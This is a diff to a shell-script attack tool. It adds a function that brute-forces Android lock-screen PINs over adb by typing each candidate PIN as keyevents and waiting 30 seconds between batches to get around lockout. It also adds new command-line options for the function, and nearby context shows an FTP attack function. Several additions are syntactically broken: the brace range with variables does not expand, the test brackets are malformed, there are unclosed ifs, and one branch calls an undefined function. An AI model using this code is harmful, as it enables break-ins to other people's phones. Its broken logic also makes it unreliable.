@@ -297,6 +297,38 @@ androidgui6() {
             fi
         done
     }
+    
+customandroidgui() {
+    read -p "Min: " min1
+    read -p "Max: " max1
+    screen="$(adb shell dumpsys nfc | grep 'mScreenState=')"
+    case $screen in
+        "mScreenState=OFF") echo -e "Preparing to attack."; 
+            echo -e "All Has Been Set" ;;
+        "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
+    esac
+    echo -e "Bruteforce attack will be started within 2 seconds..\nPlease use (CTRL+C) to abort the attack at anytime.."
+    adb shell input keyevent 82
+    adb shell input swipe 407 1211 378 85
+    for i in {$min1..$max1}; do
+        echo -e "\e[0;1mTrying pin:  $i\e[0m"
+        for (( j=0; j<${#i}; j++ )); do
+            adb shell input keyevent $((`echo ${i:$j:1}`+7))
+        done
+        adb shell input keyevent 66
+        adb shell input swipe 407 1211 378 85
+        clear() {
+            adb shell input keyevent KEYCODE_MOVE_END
+            adb shell input keyevent --longpress $(printf 'KEYCODE_DEL %.0s' {1..250}); } ;clear
+            if ! (( `expr $i + 1` % 4 )); then
+                adb shell input keyevent 66
+                sleep 30
+                adb shell input keyevent 82
+                adb shell input swipe 407 1211 378 85
+            fi
+        done
+    }
+
 
 ftpattack() {
     which ftp &> /dev/null
@@ -578,6 +610,12 @@ elif [[ $1 = "--android" && $2 = "6" ]] || [[ $1 = "-a" && $2 = "6" ]]; then
     android_status
     multidevices
     android6
+if [[ $1 = "--custom"]] || [[ $1 = "-c"]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    customandroid
 elif [[ $1 = "--android-gui" && $2 = "4" ]] || [[ $1 = "-A" && $2 = "4" ]]; then
     androiddebug
     adbexist
@@ -590,6 +628,12 @@ elif [[ $1 = "--android-gui" && $2 = "6" ]] || [[ $1 = "-A" && $2 = "6" ]]; then
     android_status
     multidevices
     androidgui6
+    if [[ $1 = "--custom-gui"]] || [[ $1 = "-C"]]; then
+    androiddebug
+    adbexist
+    android_status
+    multidevices
+    customandroidgui
 elif [[ $1 = "--android" && ! $2 = "4" ]] || [[ $1 = "-a" && ! $2 = "4" ]]; then
     androiddebug
     adbexist
